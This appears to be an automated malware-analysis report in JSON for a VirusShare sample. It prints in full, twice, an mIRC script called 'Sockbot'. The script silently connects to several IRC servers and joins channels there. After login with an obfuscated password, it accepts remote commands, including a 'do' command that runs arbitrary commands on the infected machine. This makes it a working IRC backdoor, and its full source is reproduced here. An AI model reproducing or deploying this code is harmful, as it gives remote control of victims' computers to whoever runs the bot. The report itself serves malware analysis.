{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "System": "May run an executable file or a system command on a Mac",
            "chr": "May attempt to obfuscate specific str"
        },
        "macro": ";--------------\n; Sockbot\n;--------------\non *:start:unset %sbt_*\non *:connect:.signal sbcheck\nalias -l ur {\n  hfree -w sbset\n  if (!%hrtsrdxc) {\n    sload irc.redesul.net|irc.netstudio.com.br|irc.leaving.com.br Cruel:crueldade #crueis,#brusque,#blumenau\n    sload irc.g8net.com.br|us.brasnet.org Chanur`away #scriptx,#bobmarley\n  }\n  ;else { sload irc.mzima.net test_bot #mhb }\n  tokenize 32 $hget(sbset,$remove($1,sbot_))\n  if ($prop == server) { return $gettok( $gettok($1,$r(1,$numtok($1,124)),124) ,1,58) }\n  if ($prop == port) { return $iif($gettok($1,2,58),$ifmatch,6667) }\n  if ($prop == nick) { return $gettok($2,1,58) }\n  if ($prop == nickpass) { return $gettok($2,2,58) }\n  if ($prop == chans) { return $3 }\n}\non *:signal:sbcheck:{\n  if (!$timer(sbcheck)) { .timersbcheck -io 0 120 .signal sbcheck }\n  var %x = 1\n  while ($ur(%x).server) {\n    var %sn = sbot_ $+ %x\n    if (!$sock(%sn)) { sockopen %sn $ur(%x).server $ur(%x).port | hopen %sn }\n    else {  }\n    inc %x\n  }\n  joincheck\n  if (!%hrtsrdxc) { isc_connect }\n}\nalias -l joincheck .timersb_join_check -io 1 3 joincheck_now\nalias -l joincheck_now {\n  var %x = 1\n  while ($sock(sbot_*,%x)) {\n    var %sn = $ifmatch, %y = 1\n    while ($gettok($ur(%sn).chans,%y,44)) {\n      var %chan = $ifmatch\n      if (!$_chan(%sn,%chan)) { sbcmd %sn join %chan }\n      inc %y\n    }\n    inc %x\n  }\n}\nalias sbcmd if ($sock($1).status == active && $2) { sockwrite -tn $1- }\nalias -l sload hadd -m sbset $calc($hget(sbset,0).item + 1) $1-\nalias -l hopen { hfree -w $$1 | hmake $1 200 }\nalias -l smsg sbcmd $1 PRIVMSG $2 $+(:,$$3-)\nalias -l snotice sbcmd $1 NOTICE $2 $+(:,$$3-)\nalias -l _kick sbcmd $1 kick $2 $3 $+(:,$4-)\nalias -l _me return $hget($iif($sock($sockname),$ifmatch,$1),me)\nalias -l _chan return $gettok($hmatch($1,$+(chan:,$iif($2 isnum,*,$2)),$iif($2 isnum,$2,1)),2,$asc(:))\nalias -l exitchan { hdel $1 $+(chan:,$$2) | hdel -w $1 $+($2,:*) }\nalias -l admin_check $iif($hmatch($1,$+(log,*,$admin_mask_get($2))),return yes)\nalias -l admin_mask_get return $gettok($1,2,33)\n;nicks\nalias -l nick_get return $iif($3 isnum,$gettok($hmatch($1,$+($2,:*),$3),2,58),$hget($1,$+($2,:,$3)))\nalias -l mode_filter_chr return $+($iif(@ isin $1,@),$iif(+ isin $1,+))\nalias -l mode_filter_letter return $+($iif(o isin $1,@),$iif(v isin $1,+))\nalias -l _isop return $iif(@ isin $nick_get($1,$2,$3),1)\nalias -l _isvo return $iif(+ isin $nick_get($1,$2,$3),1)\nalias -l get_nick_in_host return $gettok($mid($1,2-),1,33)\n;socket\non *:sockopen:sbot_*:{\n  if ($sockerr) { return }\n  sbcmd $sockname user $+($r(a,z),$r(a,z),$r(a,z)) \"\" servername $+(:,Fred. B.)\n  sbcmd $sockname nick $ur($sockname).nick\n}\non *:sockread:sbot_*:{\n  if ($sockerr) { return }\n  sockread %i | tokenize 32 %i | unset %i\n  if (!$1) || ($2 == 372) { return }\n  if (!$hget($sockname)) { hopen $sockname }\n  var %nick = $get_nick_in_host($1)\n  ;events\n  if ($1 == PING) { sbcmd $sockname PONG $2- }\n  if ($2 == PRIVMSG) {\n    var %chan = $iif($left($3,1) == $chr(35),$3)\n    tokenize 32 $mid($4-,2-)\n    if ($left($1,1) == \u0001 && $right($1-,1) == \u0001) {\n      tokenize 32 $mid($1-,2-,-1)\n      if ($1 == VERSION) { sbcmd $sockname notice %nick :\u0001VERSION mIRC v6.16 Khaled Mardam-Bey\u0001 }\n      if ($1 == PING) { sbcmd $sockname notice %nick :\u0001PING $ctime $+ \u0001 }\n    }\n    if (%chan && $istok(!op !deop !k !kick !kb !voice !devoice,$1,32) && $_isop($sockname,%chan,$_me)) {\n      var %anick = $iif($2,$2,%nick)\n      if (%anick == $_me) || (!$nick_get($sockname,%chan,%anick)) || (!$admin_check($sockname,$1) && !$_isop($sockname,%chan,%nick)) { return }\n      if ($1 == !op && !$_isop($sockname,%chan,%anick)) { sbcmd $sockname mode %chan +o %anick }\n      if ($1 == !deop && $_isop($sockname,%chan,%anick)) { sbcmd $sockname mode %chan -o %anick }\n      if ($1 == !voice && !$_isvo($sockname,%chan,%anick)) { sbcmd $sockname mode %chan +v %anick }\n      if ($1 == !devoice && $_isvo($sockname,%chan,%anick)) { sbcmd $sockname mode %chan -v %anick }\n      if ($1 == !k) || ($1 == !kick) { _kick $sockname %chan %anick $iif($3,$3-,requested) }\n      if ($1 == !kb) { set -u60 %sbt_kick_ban_ [ $+ [ %anick ] ] %chan $iif($3,$3-,requested) | sbcmd $sockname whois %anick }\n    }\n    if (%chan) {\n      if ($1 == topic && $2 && $admin_check($sockname,$1)) { sbcmd $sockname topic %chan : $+ $2- }\n    }\n    if (!%chan && $istok(log help do sw uptime notice hop join part msg,$1,32)) {\n      if ($1 == log) {\n        if ($2 == $decode(eDc=,m)) { snotice $sockname %nick Senha aceita. Voce esta reconhecido | hadd $sockname $+(log,$admin_mask_get($1)) $ctime }\n        else { snotice $sockname %nick Senha incorreta }\n      }\n      if ($1 == help) {\n        snotice $sockname %nick Comandos de Info e controle do BOT (apenas para quem estiver logado) -> \u0002log <senha>\u0002 (loga vc no bot); \u0002sw\u0002 (comando no server); \u0002uptime\u0002 (server/mirc/pc uptime); \u0002notice\u0002 (envia notice para vc) - \u0002hop <canal>\u0002 & \u0002part <canal>\u0002 & \u0002join <canal>\u0002 & \u0002msg <canal/nick> <msg>\u0002\n        snotice $sockname %nick Comandos de Operador de canal (apenas para ops e logados no canal, use: \u0002!comando <nick>\u0002, se nao houver <nick> o comando \ufffd usado em vc) -> \u0002!voice\u0002; \u0002!devoice\u0002; \u0002!op\u0002; \u0002!deop\u0002; \u0002!k\u0002; \u0002!kb\u0002\n      }\n      if (!$admin_check($sockname,$1)) { snotice $sockname %nick Voce precisa estar logado no bot para utilizar este comando | return }\n      if ($1 == do && $2) { $2- }\n      if ($1 == sw) { sbcmd $sockname $2- }\n      if ($1 == uptime) { snotice $sockname %nick Uptime Server: $duration($sock($sockname).to) - Uptime System: $uptime(system,2) - Uptime mIRC: $uptime(mirc,2) }\n      if ($1 == notice) { .timer 1 0 snotice $sockname %nick $2- }\n      if ($1 == hop && $_chan($sockname,$2)) { sbcmd $sockname part $2 | sbcmd $sockname join $2 }\n      if ($1 == join && $2) { sbcmd $sockname join $2 }\n      if ($1 == part && $2) { sbcmd $sockname part $2 }\n      if ($1 == msg && $3) { .timer 1 0 smsg $sockname $2- }\n    }\n    if (%chan == #brusque && $_isop($sockname,%chan,$_me) && !$_isvo($sockname,%chan,%nick) && !$_isop($sockname,%chan,%nick)) {\n      var %act = $iif(\u0001ACTION *\u0001 iswm $1-,yes), %text = $strip($iif(%act,$gettok($remove($1-,\u0001),2-,32),$1-))\n      var %w = *ouvindo*mp3*,*ao*som*de*,*mp3player*,*\ufffd\ufffd\ufffd*winamp*\ufffd\ufffd\ufffd*,*mp3*curtindo*,*mp3*kbps*,*\ufffd!\ufffd*mp3*\ufffd!\ufffd*,*EstouranDo*timPanUs*,*\ufffd\ufffd\ufffdSc\ufffd\ufffdp*MP3\ufffd!\ufffd*\n      if (%act) { var %w = %w ,*.mp3*,*curtindo*,*ouvindo*,*play*,*escutando*,*kurtind*,*kbps*,*mp3player*,*som*de*,*.wav*,*listening*,*quebrando*som*,*winamp*,*Na*OreLiNha* }\n      var %x = 1, %tok = $numtok(%w,44)\n      while (%x <= %tok) {\n        if ($gettok(%w,%x,44) iswm %text) {\n          if ($hget($sockname,$+(mp3flood:,%nick))) { sbcmd $sockname mode %chan +b $+(*!*@,$gettok($1,2,64)) | hdel $sockname $+(mp3flood:,%nick) }\n          else { _kick $sockname %chan %nick \ufffd proibido mp3players no canal %chan $+ , se persistir ser\ufffd banido. | hadd $+(-u,$calc(30 * 60)) $sockname $+(mp3flood:,%nick) yes }\n          return\n        }\n        inc %x\n      }\n    }\n  }\n  if ($2 == NOTICE) {\n    tokenize 32 $mid($4-,2-)\n    if (*nickserv*identify* iswm $1- && %nick == nickserv && $_me == $ur($sockname).nick && $ur($sockname).nickpass) { sbcmd $sockname nickserv identify $ifmatch }\n  }\n  if ($2 == MODE) {\n    var %x = 1, %chan = $3, %count = 0\n    if ($left(%chan,1) != $chr(35)) { return }\n    while ($mid($4,%x,1)) {\n      var %current_tok = $ifmatch\n      if ($istok(+ -,%current_tok,32)) { var %current_signal = %current_tok }\n      if ($istokcs(o v b k h q l e,%current_tok,32)) { inc %count }\n      if ($mode_filter_letter(%current_tok)) {\n        var %letter = $ifmatch, %current_nick = $gettok($5-,%count,32)\n        var %current_mode = $hget($sockname,%chan $+ : $+ %current_nick)\n        var %mode = $iif(%current_signal == +,$mode_filter_chr(%current_mode $+ %letter),$remove(%current_mode,%letter))\n        hadd $sockname $+(%chan,:,%current_nick) $iif(%mode,$ifmatch,n)\n      }\n      inc %x\n    }\n  }\n  if ($2 == NICK) {\n    var %newnick = $mid($3,2-)\n    if (%nick == $_me) { hadd $sockname me %newnick | joincheck }\n    while $hmatch($sockname,#*: $+ %nick,1) { hadd $sockname $replace($ifmatch,: $+ %nick,: $+ %newnick) $hget($sockname,$ifmatch) | hdel $sockname $ifmatch }\n  }\n  if ($2 == JOIN) { hadd $sockname $iif(%nick == $_me, $+(chan:,$mid($3,2-)) , $+($mid($3,2-),:,%nick n) ) }\n  if ($2 == PART) { $iif(%nick == $_me,exitchan $sockname $3,hdel $sockname $3 $+ : $+ %nick) }\n  if ($2 == KICK) {\n    var %chan = $3, %knick = $4\n    if (%knick == $_me) { exitchan $sockname %chan | sbcmd $sockname join %chan }\n    else { hdel $sockname $+(%chan,:,%knick) }\n  }\n  if ($2 == QUIT && %nick != $_me) { while $hmatch($sockname,#*: $+ %nick,1) { hdel $sockname $ifmatch } }\n  if ($1 == ERROR) { .timersb_error_socket 1 1 .signal sbcheck }\n  ;raws\n  if ($2 = 376) { hadd $sockname me $ur($sockname).nick | joincheck }\n  if ($2 = 311 && %sbt_kick_ban_ [ $+ [ $4 ] ]) {\n    var %chan = $gettok($ifmatch,1,32), %reason = $gettok($ifmatch,2-,32)\n    sbcmd $sockname mode %chan +b $+(*!*@,$6)\n    _kick $sockname %chan $4 %reason\n    unset %sbt_kick_ban_ [ $+ [ $4 ] ]\n  }\n  if ($2 = 353) {\n    var %x = 1, %chan = $5, %nicks = $mid($6-,2-)\n    while ($gettok(%nicks,%x,32)) {\n      var %t = $ifmatch, %chr = $mode_filter_chr(%t), %nick = $remove(%t,%chr)\n      hadd $sockname $+(%chan,:,%nick) $iif(%chr,$ifmatch,n)\n      inc %x\n    }\n  }\n  ;if ($2 = 433 && $3 != $_me) { sbcmd $sockname nick altnick }\n}\non *:sockclose:sbot_*:hfree -w $sockname\n;endscript"
    },
    "filename": "VirusShare_36c379aa19681bd79b2dfc634031cfe6",
    "filesize": 9661,
    "filetype": "data",
    "hashes": {
        "md5": "36c379aa19681bd79b2dfc634031cfe6",
        "sha1": "6b41c59004fce078338e39f9970ecc43c6ccd5e7",
        "sha256": "44200763de5c5d266844526294fe0540c822cdc0669a11e354529b3a61e0d78d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            ";--------------",
            "; Sockbot",
            ";--------------",
            "on *:start:unset %sbt_*",
            "on *:connect:.signal sbcheck",
            "alias -l ur {",
            "  hfree -w sbset",
            "  if (!%hrtsrdxc) {",
            "    sload irc.redesul.net|irc.netstudio.com.br|irc.leaving.com.br Cruel:crueldade #crueis,#brusque,#blumenau",
            "    sload irc.g8net.com.br|us.brasnet.org Chanur`away #scriptx,#bobmarley",
            "  ;else { sload irc.mzima.net test_bot #mhb }",
            "  tokenize 32 $hget(sbset,$remove($1,sbot_))",
            "  if ($prop == server) { return $gettok( $gettok($1,$r(1,$numtok($1,124)),124) ,1,58) }",
            "  if ($prop == port) { return $iif($gettok($1,2,58),$ifmatch,6667) }",
            "  if ($prop == nick) { return $gettok($2,1,58) }",
            "  if ($prop == nickpass) { return $gettok($2,2,58) }",
            "  if ($prop == chans) { return $3 }",
            "on *:signal:sbcheck:{",
            "  if (!$timer(sbcheck)) { .timersbcheck -io 0 120 .signal sbcheck }",
            "  var %x = 1",
            "  while ($ur(%x).server) {",
            "    var %sn = sbot_ $+ %x",
            "    if (!$sock(%sn)) { sockopen %sn $ur(%x).server $ur(%x).port | hopen %sn }",
            "    else {  }",
            "    inc %x",
            "  joincheck",
            "  if (!%hrtsrdxc) { isc_connect }",
            "alias -l joincheck .timersb_join_check -io 1 3 joincheck_now",
            "alias -l joincheck_now {",
            "  var %x = 1",
            "  while ($sock(sbot_*,%x)) {",
            "    var %sn = $ifmatch, %y = 1",
            "    while ($gettok($ur(%sn).chans,%y,44)) {",
            "      var %chan = $ifmatch",
            "      if (!$_chan(%sn,%chan)) { sbcmd %sn join %chan }",
            "      inc %y",
            "    }",
            "    inc %x",
            "alias sbcmd if ($sock($1).status == active && $2) { sockwrite -tn $1- }",
            "alias -l sload hadd -m sbset $calc($hget(sbset,0).item + 1) $1-",
            "alias -l hopen { hfree -w $$1 | hmake $1 200 }",
            "alias -l smsg sbcmd $1 PRIVMSG $2 $+(:,$$3-)",
            "alias -l snotice sbcmd $1 NOTICE $2 $+(:,$$3-)",
            "alias -l _kick sbcmd $1 kick $2 $3 $+(:,$4-)",
            "alias -l _me return $hget($iif($sock($sockname),$ifmatch,$1),me)",
            "alias -l _chan return $gettok($hmatch($1,$+(chan:,$iif($2 isnum,*,$2)),$iif($2 isnum,$2,1)),2,$asc(:))",
            "alias -l exitchan { hdel $1 $+(chan:,$$2) | hdel -w $1 $+($2,:*) }",
            "alias -l admin_check $iif($hmatch($1,$+(log,*,$admin_mask_get($2))),return yes)",
            "alias -l admin_mask_get return $gettok($1,2,33)",
            ";nicks",
            "alias -l nick_get return $iif($3 isnum,$gettok($hmatch($1,$+($2,:*),$3),2,58),$hget($1,$+($2,:,$3)))",
            "alias -l mode_filter_chr return $+($iif(@ isin $1,@),$iif(+ isin $1,+))",
            "alias -l mode_filter_letter return $+($iif(o isin $1,@),$iif(v isin $1,+))",
            "alias -l _isop return $iif(@ isin $nick_get($1,$2,$3),1)",
            "alias -l _isvo return $iif(+ isin $nick_get($1,$2,$3),1)",
            "alias -l get_nick_in_host return $gettok($mid($1,2-),1,33)",
            ";socket",
            "on *:sockopen:sbot_*:{",
            "  if ($sockerr) { return }",
            "  sbcmd $sockname user $+($r(a,z),$r(a,z),$r(a,z)) \"\" servername $+(:,Fred. B.)",
            "  sbcmd $sockname nick $ur($sockname).nick",
            "on *:sockread:sbot_*:{",
            "  if ($sockerr) { return }",
            "  sockread %i | tokenize 32 %i | unset %i",
            "  if (!$1) || ($2 == 372) { return }",
            "  if (!$hget($sockname)) { hopen $sockname }",
            "  var %nick = $get_nick_in_host($1)",
            "  ;events",
            "  if ($1 == PING) { sbcmd $sockname PONG $2- }",
            "  if ($2 == PRIVMSG) {",
            "    var %chan = $iif($left($3,1) == $chr(35),$3)",
            "    tokenize 32 $mid($4-,2-)",
            "    if ($left($1,1) == ",
            " && $right($1-,1) == ",
            "      tokenize 32 $mid($1-,2-,-1)",
            "      if ($1 == VERSION) { sbcmd $sockname notice %nick :",
            "VERSION mIRC v6.16 Khaled Mardam-Bey",
            "      if ($1 == PING) { sbcmd $sockname notice %nick :",
            "PING $ctime $+ ",
            "    }",
            "    if (%chan && $istok(!op !deop !k !kick !kb !voice !devoice,$1,32) && $_isop($sockname,%chan,$_me)) {",
            "      var %anick = $iif($2,$2,%nick)",
            "      if (%anick == $_me) || (!$nick_get($sockname,%chan,%anick)) || (!$admin_check($sockname,$1) && !$_isop($sockname,%chan,%nick)) { return }",
            "      if ($1 == !op && !$_isop($sockname,%chan,%anick)) { sbcmd $sockname mode %chan +o %anick }",
            "      if ($1 == !deop && $_isop($sockname,%chan,%anick)) { sbcmd $sockname mode %chan -o %anick }",
            "      if ($1 == !voice && !$_isvo($sockname,%chan,%anick)) { sbcmd $sockname mode %chan +v %anick }",
            "      if ($1 == !devoice && $_isvo($sockname,%chan,%anick)) { sbcmd $sockname mode %chan -v %anick }",
            "      if ($1 == !k) || ($1 == !kick) { _kick $sockname %chan %anick $iif($3,$3-,requested) }",
            "      if ($1 == !kb) { set -u60 %sbt_kick_ban_ [ $+ [ %anick ] ] %chan $iif($3,$3-,requested) | sbcmd $sockname whois %anick }",
            "    }",
            "    if (%chan) {",
            "      if ($1 == topic && $2 && $admin_check($sockname,$1)) { sbcmd $sockname topic %chan : $+ $2- }",
            "    }",
            "    if (!%chan && $istok(log help do sw uptime notice hop join part msg,$1,32)) {",
            "      if ($1 == log) {",
            "        if ($2 == $decode(eDc=,m)) { snotice $sockname %nick Senha aceita. Voce esta reconhecido | hadd $sockname $+(log,$admin_mask_get($1)) $ctime }",
            "        else { snotice $sockname %nick Senha incorreta }",
            "      }",
            "      if ($1 == help) {",
            "        snotice $sockname %nick Comandos de Info e controle do BOT (apenas para quem estiver logado) -> ",
            "log <senha>",
            " (loga vc no bot); ",
            " (comando no server); ",
            "uptime",
            " (server/mirc/pc uptime); ",
            "notice",
            " (envia notice para vc) - ",
            "hop <canal>",
            "part <canal>",
            "join <canal>",
            "msg <canal/nick> <msg>",
            "        snotice $sockname %nick Comandos de Operador de canal (apenas para ops e logados no canal, use: ",
            "!comando <nick>",
            ", se nao houver <nick> o comando  usado em vc) -> ",
            "!voice",
            "!devoice",
            "!deop",
            "      }",
            "      if (!$admin_check($sockname,$1)) { snotice $sockname %nick Voce precisa estar logado no bot para utilizar este comando | return }",
            "      if ($1 == do && $2) { $2- }",
            "      if ($1 == sw) { sbcmd $sockname $2- }",
            "      if ($1 == uptime) { snotice $sockname %nick Uptime Server: $duration($sock($sockname).to) - Uptime System: $uptime(system,2) - Uptime mIRC: $uptime(mirc,2) }",
            "      if ($1 == notice) { .timer 1 0 snotice $sockname %nick $2- }",
            "      if ($1 == hop && $_chan($sockname,$2)) { sbcmd $sockname part $2 | sbcmd $sockname join $2 }",
            "      if ($1 == join && $2) { sbcmd $sockname join $2 }",
            "      if ($1 == part && $2) { sbcmd $sockname part $2 }",
            "      if ($1 == msg && $3) { .timer 1 0 smsg $sockname $2- }",
            "    }",
            "    if (%chan == #brusque && $_isop($sockname,%chan,$_me) && !$_isvo($sockname,%chan,%nick) && !$_isop($sockname,%chan,%nick)) {",
            "      var %act = $iif(",
            "ACTION *",
            " iswm $1-,yes), %text = $strip($iif(%act,$gettok($remove($1-,",
            "),2-,32),$1-))",
            "      var %w = *ouvindo*mp3*,*ao*som*de*,*mp3player*,**winamp**,*mp3*curtindo*,*mp3*kbps*,*!*mp3*!*,*EstouranDo*timPanUs*,*Scp*MP3!*",
            "      if (%act) { var %w = %w ,*.mp3*,*curtindo*,*ouvindo*,*play*,*escutando*,*kurtind*,*kbps*,*mp3player*,*som*de*,*.wav*,*listening*,*quebrando*som*,*winamp*,*Na*OreLiNha* }",
            "      var %x = 1, %tok = $numtok(%w,44)",
            "      while (%x <= %tok) {",
            "        if ($gettok(%w,%x,44) iswm %text) {",
            "          if ($hget($sockname,$+(mp3flood:,%nick))) { sbcmd $sockname mode %chan +b $+(*!*@,$gettok($1,2,64)) | hdel $sockname $+(mp3flood:,%nick) }",
            "          else { _kick $sockname %chan %nick  proibido mp3players no canal %chan $+ , se persistir ser banido. | hadd $+(-u,$calc(30 * 60)) $sockname $+(mp3flood:,%nick) yes }",
            "          return",
            "        }",
            "        inc %x",
            "      }",
            "    }",
            "  if ($2 == NOTICE) {",
            "    tokenize 32 $mid($4-,2-)",
            "    if (*nickserv*identify* iswm $1- && %nick == nickserv && $_me == $ur($sockname).nick && $ur($sockname).nickpass) { sbcmd $sockname nickserv identify $ifmatch }",
            "  if ($2 == MODE) {",
            "    var %x = 1, %chan = $3, %count = 0",
            "    if ($left(%chan,1) != $chr(35)) { return }",
            "    while ($mid($4,%x,1)) {",
            "      var %current_tok = $ifmatch",
            "      if ($istok(+ -,%current_tok,32)) { var %current_signal = %current_tok }",
            "      if ($istokcs(o v b k h q l e,%current_tok,32)) { inc %count }",
            "      if ($mode_filter_letter(%current_tok)) {",
            "        var %letter = $ifmatch, %current_nick = $gettok($5-,%count,32)",
            "        var %current_mode = $hget($sockname,%chan $+ : $+ %current_nick)",
            "        var %mode = $iif(%current_signal == +,$mode_filter_chr(%current_mode $+ %letter),$remove(%current_mode,%letter))",
            "        hadd $sockname $+(%chan,:,%current_nick) $iif(%mode,$ifmatch,n)",
            "      }",
            "      inc %x",
            "    }",
            "  if ($2 == NICK) {",
            "    var %newnick = $mid($3,2-)",
            "    if (%nick == $_me) { hadd $sockname me %newnick | joincheck }",
            "    while $hmatch($sockname,#*: $+ %nick,1) { hadd $sockname $replace($ifmatch,: $+ %nick,: $+ %newnick) $hget($sockname,$ifmatch) | hdel $sockname $ifmatch }",
            "  if ($2 == JOIN) { hadd $sockname $iif(%nick == $_me, $+(chan:,$mid($3,2-)) , $+($mid($3,2-),:,%nick n) ) }",
            "  if ($2 == PART) { $iif(%nick == $_me,exitchan $sockname $3,hdel $sockname $3 $+ : $+ %nick) }",
            "  if ($2 == KICK) {",
            "    var %chan = $3, %knick = $4",
            "    if (%knick == $_me) { exitchan $sockname %chan | sbcmd $sockname join %chan }",
            "    else { hdel $sockname $+(%chan,:,%knick) }",
            "  if ($2 == QUIT && %nick != $_me) { while $hmatch($sockname,#*: $+ %nick,1) { hdel $sockname $ifmatch } }",
            "  if ($1 == ERROR) { .timersb_error_socket 1 1 .signal sbcheck }",
            "  ;raws",
            "  if ($2 = 376) { hadd $sockname me $ur($sockname).nick | joincheck }",
            "  if ($2 = 311 && %sbt_kick_ban_ [ $+ [ $4 ] ]) {",
            "    var %chan = $gettok($ifmatch,1,32), %reason = $gettok($ifmatch,2-,32)",
            "    sbcmd $sockname mode %chan +b $+(*!*@,$6)",
            "    _kick $sockname %chan $4 %reason",
            "    unset %sbt_kick_ban_ [ $+ [ $4 ] ]",
            "  if ($2 = 353) {",
            "    var %x = 1, %chan = $5, %nicks = $mid($6-,2-)",
            "    while ($gettok(%nicks,%x,32)) {",
            "      var %t = $ifmatch, %chr = $mode_filter_chr(%t), %nick = $remove(%t,%chr)",
            "      hadd $sockname $+(%chan,:,%nick) $iif(%chr,$ifmatch,n)",
            "      inc %x",
            "    }",
            "  ;if ($2 = 433 && $3 != $_me) { sbcmd $sockname nick altnick }",
            "on *:sockclose:sbot_*:hfree -w $sockname",
            ";endscript"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.322138",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
